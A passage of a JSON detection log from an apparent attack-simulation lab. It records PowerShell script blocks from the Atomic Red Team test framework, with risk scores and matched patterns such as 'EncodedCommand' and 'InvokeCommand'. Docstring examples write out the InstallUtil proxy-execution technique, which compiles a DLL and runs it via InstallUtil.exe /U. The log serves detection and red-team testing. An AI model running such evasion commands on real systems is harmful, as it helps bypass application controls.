      "full_command": "# The class definitions that these functions rely upon are located in Private\\AtomicClassSchema.ps1\n\nfunction New-AtomicTechnique {\n    <#\n.SYNOPSIS\n\nSpecifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.\n\n.PARAMETER AttackTechnique\n\nSpecifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with \"T\" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN\n\n.PARAMETER DisplayName\n\nSpecifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'\n\n.PARAMETER AtomicTests\n\nSpecifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n# Note: the input arguments are identical for atomic test #1 and #2\n$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename} #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{filename}\n'@\n\n$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2\n\n# Everything is ready to convert to YAML now!\n$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml\n\n.OUTPUTS\n\nAtomicTechnique\n\nOutputs an object representing an atomic technique.\n\nThe output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory)]\n        [String[]]\n        $AttackTechnique,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $DisplayName,\n\n        [Parameter(Mandatory)]\n        [AtomicTest[]]\n        [ValidateNotNull()]\n        $AtomicTests\n    )\n\n    $AtomicTechniqueInstance = [AtomicTechnique]::new()\n\n    foreach ($Technique in $AttackTechnique) {\n        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.\n        # This is not a requirement so just warn the user.\n        if ($Technique -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n            Write-Warning \"The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique\"\n        }\n    }\n\n    $AtomicTechniqueInstance.attack_technique = $AttackTechnique\n    $AtomicTechniqueInstance.display_name = $DisplayName\n    $AtomicTechniqueInstance.atomic_tests = $AtomicTests\n\n    return $AtomicTechniqueInstance\n}\n\nfunction New-AtomicTest {\n    <#\n.SYNOPSIS\n\nSpecifies an atomic test.\n\n.PARAMETER Name\n\nSpecifies the name of the test that indicates how it tests the technique.\n\n.PARAMETER Description\n\nSpecifies a long form description of the test. Markdown is supported.\n\n.PARAMETER SupportedPlatforms\n\nSpecifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.\n\nA single test can support multiple platforms.\n\n.PARAMETER ExecutorType\n\nSpecifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.\n\n- CommandPrompt: The Windows Command Prompt, aka cmd.exe\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.\n\n- PowerShell: PowerShell\n  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe\n\n- Sh: Linux's bourne shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.\n\n- Bash: Linux's bourne again shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.\n\n.PARAMETER ExecutorElevationRequired\n\nSpecifies that the test must run with elevated privileges.\n\n.PARAMETER ExecutorSteps\n\nSpecifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.\n\n.PARAMETER ExecutorCommand\n\nSpecifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.\n\nThe -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the \"PowerShell\" ExecutorType is specified.\n\n.PARAMETER ExecutorCleanupCommand\n\nSpecifies the command to execute if there are any artifacts that need to be cleaned up.\n\n.PARAMETER InputArguments\n\nSpecifies one or more input arguments. Input arguments are defined using the New-AtomicTestInputArgument function.\n\n.PARAMETER DependencyExecutorType\n\nSpecifies an override execution type for dependencies. By default, dependencies are executed using the framework specified in -ExecutorType.\n\nIn most cases, 'PowerShell' is specified as a dependency executor type when 'CommandPrompt' is specified as an executor type.\n\n.PARAMETER Dependencies\n\nSpecifies one or more dependencies. Dependencies are defined using the New-AtomicTestDependency function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments $InputArg1, $InputArg2 -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n.OUTPUTS\n\nAtomicTest\n\nOutputs an object representing an atomic test. This object is intended to be supplied to the New-AtomicTechnique -AtomicTests parameter.\n\nThe output of New-AtomicTest can be piped to ConvertTo-Yaml. The resulting output can be added to an existing atomic technique YAML doc.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'AutomatedExecutor')]\n    [OutputType([AtomicTest])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String[]]\n        [ValidateSet('Windows', 'macOS', 'Linux')]\n        $SupportedPlatforms,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $ExecutorType,\n\n        [Switch]\n        $ExecutorElevationRequired,\n\n        [Parameter(Mandatory, ParameterSetName = 'ManualExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorSteps,\n\n        [Parameter(Mandatory, ParameterSetName = 'AutomatedExecutor')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCommand,\n\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $ExecutorCleanupCommand,\n\n        [AtomicInputArgument[]]\n        $InputArguments,\n\n        [String]\n        [ValidateSet('CommandPrompt', 'Sh', 'Bash', 'PowerShell')]\n        $DependencyExecutorType,\n\n        [AtomicDependency[]]\n        $Dependencies\n    )\n\n    $AtomicTestInstance = [AtomicTest]::new()\n\n    $AtomicTestInstance.name = $Name\n    $AtomicTestInstance.description = $Description\n    $AtomicTestInstance.supported_platforms = $SupportedPlatforms | ForEach-Object { $_.ToLower() }\n\n    $StringsWithPotentialInputArgs = New-Object -TypeName 'System.Collections.Generic.List`1[String]'\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'AutomatedExecutor' {\n            $ExecutorInstance = [AtomicExecutorDefault]::new()\n            $ExecutorInstance.command = $ExecutorCommand\n            $StringsWithPotentialInputArgs.Add($ExecutorCommand)\n        }\n\n        'ManualExecutor' {\n            $ExecutorInstance = [AtomicExecutorManual]::new()\n            $ExecutorInstance.steps = $ExecutorSteps\n            $StringsWithPotentialInputArgs.Add($ExecutorSteps)\n        }\n    }\n\n    switch ($ExecutorType) {\n        'CommandPrompt' { $ExecutorInstance.name = 'command_prompt' }\n        default { $ExecutorInstance.name = $ExecutorType.ToLower() }\n    }\n\n    if ($ExecutorCleanupCommand) {\n        $ExecutorInstance.cleanup_command = $ExecutorCleanupCommand\n        $StringsWithPotentialInputArgs.Add($ExecutorCleanupCommand)\n    }\n\n    if ($ExecutorElevationRequired) { $ExecutorInstance.elevation_required = $True }\n\n    if ($Dependencies) {\n        foreach ($Dependency in $Dependencies) {\n            $StringsWithPotentialInputArgs.Add($Dependency.description)\n            $StringsWithPotentialInputArgs.Add($Dependency.prereq_command)\n            $StringsWithPotentialInputArgs.Add($Dependency.get_prereq_command)\n        }\n    }\n\n    if ($DependencyExecutorType) {\n        switch ($DependencyExecutorType) {\n            'CommandPrompt' { $AtomicTestInstance.dependency_executor_name = 'command_prompt' }\n            default { $AtomicTestInstance.dependency_executor_name = $DependencyExecutorType.ToLower() }\n        }\n    }    $AtomicTestInstance.dependencies = $Dependencies\n\n    [Hashtable] $InputArgHashtable = @{ }\n\n    if ($InputArguments.Count) {\n        # Determine if any of the input argument names repeat. They must be unique.\n        $InputArguments | Group-Object -Property Name | Where-Object { $_.Count -gt 1 } | ForEach-Object {\n            Write-Error \"There are $($_.Count) instances of the $($_.Name) input argument. Input argument names must be unique.\"\n            return\n        }\n\n        # Convert each input argument to a hashtable where the key is the Name property.\n\n        foreach ($InputArg in $InputArguments) {\n            # Create a copy of the passed input argument that doesn't include the \"Name\" property.\n            # Passing in a shallow copy adversely affects YAML serialization for some reason.\n            $NewInputArg = [AtomicInputArgument]::new()\n            $NewInputArg.default = $InputArg.default\n            $NewInputArg.description = $InputArg.description\n            $NewInputArg.type = $InputArg.type\n\n            $InputArgHashtable[$InputArg.Name] = $NewInputArg\n        }\n\n        $AtomicTestInstance.input_arguments = $InputArgHashtable\n    }\n\n    # Extract all specified input arguments from executor and any dependencies.\n    $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n    [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n    ForEach-Object { $Regex.Matches($_) } |\n    Select-Object -ExpandProperty Groups |\n    Where-Object { $_.Name -eq 'ArgName' } |\n    Select-Object -ExpandProperty Value |\n    Sort-Object -Unique\n\n\n    # Validate that all executor arguments are defined as input arguments\n    if ($InputArgumentNamesFromExecutor.Count) {\n        $InputArgumentNamesFromExecutor | ForEach-Object {\n            if ($InputArgHashtable.Keys -notcontains $_) {\n                Write-Error \"The following input argument was specified but is not defined: '$_'\"\n                return\n            }\n        }\n    }\n\n    # Validate that all defined input args are utilized at least once in the executor.\n    if ($InputArgHashtable.Keys.Count) {\n        $InputArgHashtable.Keys | ForEach-Object {\n            if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                # Write a warning since this scenario is not considered a breaking change\n                Write-Warning \"The following input argument is defined but not utilized: '$_'.\"\n            }\n        }\n    }\n\n    $AtomicTestInstance.executor = $ExecutorInstance\n\n    return $AtomicTestInstance\n}\n\nfunction New-AtomicTestDependency {\n    <#\n.SYNOPSIS\n\nSpecifies a new dependency that must be met prior to execution of an atomic test.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the dependency. This should be worded in the following form: SOMETHING must SOMETHING\n\n.PARAMETER PrereqCommand\n\nSpecifies commands to check if prerequisites for running this test are met.\n\nFor the \"command_prompt\" executor, if any command returns a non-zero exit code, the pre-requisites are not met.\n\nFor the \"powershell\" executor, all commands are run as a script block and the script block must return 0 for success.\n\n.PARAMETER GetPrereqCommand\n\nSpecifies commands to meet this prerequisite or a message describing how to meet this prereq\n\nMore specifically, this command is designed to satisfy either of the following conditions:\n\n1) If a prerequisite is not met, perform steps necessary to satify the prerequisite. Such a command should be implemented when prerequisites can be satisfied in an automated fashion.\n2) If a prerequisite is not met, inform the user what the steps are to satisfy the prerequisite. Such a message should be presented to the user in the case that prerequisites cannot be satisfied in an automated fashion.\n\n.EXAMPLE\n\n$Dependency = New-AtomicTestDependency -Description 'Folder to zip must exist (#{input_file_folder})' -PrereqCommand 'test -e #{input_file_folder}' -GetPrereqCommand 'echo Please set input_file_folder argument to a folder that exists'\n\n.OUTPUTS\n\nAtomicDependency\n\nOutputs an object representing an atomic test dependency. This object is intended to be supplied to the New-AtomicTest -Dependencies parameter.\n\nNote: due to a bug in PowerShell classes, the get_prereq_command property will not display by default. If all fields must be explicitly displayed, they can be viewed by piping output to \"Select-Object description, prereq_command, get_prereq_command\".\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicDependency])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $PrereqCommand,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $GetPrereqCommand\n    )\n\n    $DependencyInstance = [AtomicDependency]::new()\n\n    $DependencyInstance.description = $Description\n    $DependencyInstance.prereq_command = $PrereqCommand\n    $DependencyInstance.get_prereq_command = $GetPrereqCommand\n\n    return $DependencyInstance\n}\n\nfunction New-AtomicTestInputArgument {\n    <#\n.SYNOPSIS\n\nSpecifies an input to an atomic test that is a requirement to run the test (think of these like function arguments).\n\n.PARAMETER Name\n\nSpecifies the name of the input argument. This must be lowercase and can optionally, have underscores. The input argument name is what is specified as arguments within executors and dependencies.\n\n.PARAMETER Description\n\nSpecifies a human-readable description of the input argument.\n\n.PARAMETER Type\n\nSpecifies the data type of the input argument. The following data types are supported: Path, Url, String, Integer, Float. If an alternative data type must be supported, use the -TypeOverride parameter.\n\n.PARAMETER TypeOverride\n\nSpecifies an unsupported input argument data type. Specifying this parameter should not be common.\n\n.PARAMETER Default\n\nSpecifies a default value for an input argument if one is not specified via the Invoke-AtomicTest -InputArgs parameter.\n\n.EXAMPLE\n\n$AtomicInputArgument = New-AtomicTestInputArgument -Name 'rar_exe' -Type Path -Description 'The RAR executable from Winrar' -Default '%programfiles%\\WinRAR\\Rar.exe'\n\n.OUTPUTS\n\nAtomicInputArgument\n\nOutputs an object representing an atomic test input argument. This object is intended to be supplied to the New-AtomicTest -InputArguments parameter.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'PredefinedType')]\n    [OutputType([AtomicInputArgument])]\n    param (\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Name,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Description,\n\n        [Parameter(Mandatory, ParameterSetName = 'PredefinedType')]\n        [String]\n        [ValidateSet('Path', 'Url', 'String', 'Integer', 'Float')]\n        $Type,\n\n        [Parameter(Mandatory, ParameterSetName = 'TypeOverride')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $TypeOverride,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Default\n    )\n\n    if ($Name -notmatch '^(?-i:[0-9a-z_]+)$') {\n        Write-Error \"Input argument names must be lowercase and optionally, contain underscores. Input argument name supplied: $Name\"\n        return\n    }\n\n    $AtomicInputArgInstance = [AtomicInputArgument]::new()\n\n    $AtomicInputArgInstance.description = $Description\n    $AtomicInputArgInstance.default = $Default\n\n    if ($Type) {\n        $AtomicInputArgInstance.type = $Type\n\n        # Validate input argument types when it makes sense to do so.\n        switch ($Type) {\n            'Url' {\n                if (-not [Uri]::IsWellFormedUriString($Type, [UriKind]::RelativeOrAbsolute)) {\n                    Write-Warning \"The specified Url is not properly formatted: $Type\"\n                }\n            }\n\n            'Integer' {\n                if (-not [Int]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Int is not properly formatted: $Type\"\n                }\n            }\n\n            'Float' {\n                if (-not [Double]::TryParse($Type, [Ref] $null)) {\n                    Write-Warning \"The specified Float is not properly formatted: $Type\"\n                }\n            }\n\n            # The following supported data types do not make sense to validate:\n            # 'Path' { }\n            # 'String' { }\n        }\n    }\n    else {\n        $AtomicInputArgInstance.type = $TypeOverride\n    }\n\n    # Add Name as a note property since the Name property cannot be defined in the AtomicInputArgument\n    # since it must be stored as a hashtable where the name is the key. Fortunately, ConvertTo-Yaml\n    # won't convert note properties during serialization.\n    $InputArgument = Add-Member -InputObject $AtomicInputArgInstance -MemberType NoteProperty -Name Name -Value $Name -PassThru\n\n    return $InputArgument\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'EncodedCommand' matched: '-e #'"
    },
    {
      "timestamp": "2024-12-16T20:34:57.270323+00:00",
      "event_id": 35711106,
      "risk_score": 4,
      "detected_patterns": ", InvokeCommand",
      "pattern_details": "InvokeCommand [Score: 4]",
      "command_length": 3474,
      "full_command": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $scriptParentPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:55.2656447+00:00",
      "event_id": 35710727,
      "risk_score": 4,
      "detected_patterns": ", InvokeCommand",
      "pattern_details": "InvokeCommand [Score: 4]",
      "command_length": 3474,
      "full_command": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $scriptParentPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": "Pattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'\nPattern 'InvokeCommand' matched: 'invoke-command'"
    },
    {
      "timestamp": "2024-12-16T20:34:54.4472439+00:00",
      "event_id": 35710573,
      "risk_score": 4,
      "detected_patterns": ", EncodedCommand",
      "pattern_details": "EncodedCommand [Score: 4]",
      "command_length": 19452,
      "full_command": "# The class definitions that these functions rely upon are located in Private\\AtomicClassSchema.ps1\n\nfunction New-AtomicTechnique {\n    <#\n.SYNOPSIS\n\nSpecifies a new atomic red team technique. The output of this function is designed to be piped directly to ConvertTo-Yaml, eliminating the need to work with YAML directly.\n\n.PARAMETER AttackTechnique\n\nSpecifies one or more MITRE ATT&CK techniques that to which this technique applies. Per MITRE naming convention, an attack technique should start with \"T\" followed by a 4 digit number. The MITRE sub-technique format is also supported: TNNNN.NNN\n\n.PARAMETER DisplayName\n\nSpecifies the name of the technique as defined by ATT&CK. Example: 'Audio Capture'\n\n.PARAMETER AtomicTests\n\nSpecifies one or more atomic tests. Atomic tests are created using the New-AtomicTest function.\n\n.EXAMPLE\n\n$InputArg1 = New-AtomicTestInputArgument -Name filename -Description 'location of the payload' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.dll'\n$InputArg2 = New-AtomicTestInputArgument -Name source -Description 'location of the source code to compile' -Type Path -Default 'PathToAtomicsFolder\\T1118\\src\\T1118.cs'\n\n$AtomicTest1 = New-AtomicTest -Name 'InstallUtil uninstall method call' -Description 'Executes the Uninstall Method' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename}  #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}\n'@\n\n# Note: the input arguments are identical for atomic test #1 and #2\n$AtomicTest2 = New-AtomicTest -Name 'InstallUtil GetHelp method call' -Description 'Executes the Help property' -SupportedPlatforms Windows -InputArguments @($InputArg1, $InputArg2) -ExecutorType CommandPrompt -ExecutorCommand @'\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library /out:#{filename} #{source}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /? #{filename}\n'@\n\n$AtomicTechnique = New-AtomicTechnique -AttackTechnique T1118 -DisplayName InstallUtil -AtomicTests $AtomicTest1, $AtomicTest2\n\n# Everything is ready to convert to YAML now!\n$AtomicTechnique | ConvertTo-Yaml | Out-File T1118.yaml\n\n.OUTPUTS\n\nAtomicTechnique\n\nOutputs an object representing an atomic technique.\n\nThe output of New-AtomicTechnique is designed to be piped to ConvertTo-Yaml.\n#>\n\n    [CmdletBinding()]\n    [OutputType([AtomicTechnique])]\n    param (\n        [Parameter(Mandatory)]\n        [String[]]\n        $AttackTechnique,\n\n        [Parameter(Mandatory)]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $DisplayName,\n\n        [Parameter(Mandatory)]\n        [AtomicTest[]]\n        [ValidateNotNull()]\n        $AtomicTests\n    )\n\n    $AtomicTechniqueInstance = [AtomicTechnique]::new()\n\n    foreach ($Technique in $AttackTechnique) {\n        # Attack techniques should match the MITRE ATT&CK [sub-]technique format.\n        # This is not a requirement so just warn the user.\n        if ($Technique -notmatch '^(?-i:T\\d{4}(\\.\\d{3}){0,1})$') {\n            Write-Warning \"The following supplied attack technique does not start with 'T' followed by a four digit number: $Technique\"\n        }\n    }\n\n    $AtomicTechniqueInstance.attack_technique = $AttackTechnique\n    $AtomicTechniqueInstance.display_name = $DisplayName\n    $AtomicTechniqueInstance.atomic_tests = $AtomicTests\n\n    return $AtomicTechniqueInstance\n}\n\nfunction New-AtomicTest {\n    <#\n.SYNOPSIS\n\nSpecifies an atomic test.\n\n.PARAMETER Name\n\nSpecifies the name of the test that indicates how it tests the technique.\n\n.PARAMETER Description\n\nSpecifies a long form description of the test. Markdown is supported.\n\n.PARAMETER SupportedPlatforms\n\nSpecifies the OS/platform on which the test is designed to run. The following platforms are currently supported: Windows, macOS, Linux.\n\nA single test can support multiple platforms.\n\n.PARAMETER ExecutorType\n\nSpecifies the the framework or application in which the test should be executed. The following executor types are currently supported: CommandPrompt, Sh, Bash, PowerShell.\n\n- CommandPrompt: The Windows Command Prompt, aka cmd.exe\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by cmd.exe.\n\n- PowerShell: PowerShell\n  Requires the -ExecutorCommand argument to contain a multi-line PowerShell scriptblock that will be preprocessed and then executed by powershell.exe\n\n- Sh: Linux's bourne shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by sh.\n\n- Bash: Linux's bourne again shell\n  Requires the -ExecutorCommand argument to contain a multi-line script that will be preprocessed and then executed by bash.\n\n.PARAMETER ExecutorElevationRequired\n\nSpecifies that the test must run with elevated privileges.\n\n.PARAMETER ExecutorSteps\n\nSpecifies a manual list of steps to execute. This should be specified when the atomic test cannot be executed in an automated fashion, for example when GUI steps are involved that cannot be automated.\n\n.PARAMETER ExecutorCommand\n\nSpecifies the command to execute as part of the atomic test. This should be specified when the atomic test can be executed in an automated fashion.\n\nThe -ExecutorType specified will dictate the command specified, e.g. PowerShell scriptblock code when the \"PowerShell\" ExecutorType is specified.\n\n.PARAMETER 